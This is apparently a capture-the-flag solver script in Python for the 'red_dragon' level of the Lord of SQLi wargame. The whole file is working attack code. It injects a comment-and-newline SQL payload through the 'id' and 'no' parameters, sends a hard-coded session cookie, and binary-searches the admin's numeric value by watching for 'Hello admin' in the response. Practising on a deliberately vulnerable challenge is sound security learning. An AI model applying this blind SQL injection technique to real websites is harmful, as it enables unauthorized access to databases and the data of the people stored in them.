# LordofSQLi: red_dragon
# woanmeo11

import requests

url = 'https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php'
cookies = {'PHPSESSID': 'e039r2heplar8079kk3tq79r14'}

l = int(1e8)
h = int(1e9)
while h - l > 1:
    print(f'l: {l}, h: {h}')
    m = (l + h) >> 1
    payload = {'id': "'||no>#", 'no': f'\n{m}'}
    r = requests.get(url, params=payload, cookies=cookies)
    if 'Hello admin' in r.text:
        l = m
    else:
        h = m

print(h)
